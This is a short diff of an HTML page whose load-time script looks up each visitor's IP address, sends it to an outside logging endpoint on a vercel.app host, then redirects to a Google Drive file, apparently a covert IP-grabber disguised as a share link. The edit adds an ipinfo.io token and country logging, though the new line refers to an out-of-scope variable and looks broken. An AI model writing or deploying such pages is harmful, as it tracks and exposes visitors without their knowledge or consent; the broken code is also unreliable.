@@ -2,10 +2,10 @@
 <html>
 <head>
   <script>
-    fetch('https://api.ipify.org?format=json')
+    fetch('https://ipinfo.io/json?token=dbe5d01bce6b9a')
       .then(res => res.json())
       .then(data => {
-        fetch(`https://dxvrxv.vercel.app/api/log?text=${data.ip}`);
+        fetch(`https://dxvrxv.vercel.app/api/log?text=${res.ip}-${res.country}`);
         window.location.href = 'https://drive.google.com/file/d/19fXexcK23j6wIujHCot_SwowrZhVAF3S/view?usp=sharing';
       });
   </script>
